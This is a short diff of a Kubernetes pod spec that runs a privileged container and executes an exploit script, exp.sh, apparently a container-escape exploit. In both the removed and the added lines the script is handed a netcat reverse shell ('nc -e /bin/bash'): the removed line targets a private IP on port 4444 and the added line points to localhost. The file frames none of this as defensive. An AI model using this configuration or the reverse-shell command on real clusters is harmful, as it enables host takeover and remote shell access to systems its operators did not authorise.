@@ -9,4 +9,4 @@ spec:
     securityContext:
       privileged: true
     command: ["/bin/sh"]
-    args: ["-c", "sed -i \"s|/etc/mtab|/proc/self/mounts|g\" exp.sh; chmod +x exp.sh && ./exp.sh 'nc -e /bin/bash 10.113.107.65 4444'; sleep infinity"]
+    args: ["-c", "sed -i \"s|/etc/mtab|/proc/self/mounts|g\" exp.sh; chmod +x exp.sh && ./exp.sh 'nc -nv 127.0.0.1 4444 -e /bin/bash '; sleep infinity"]
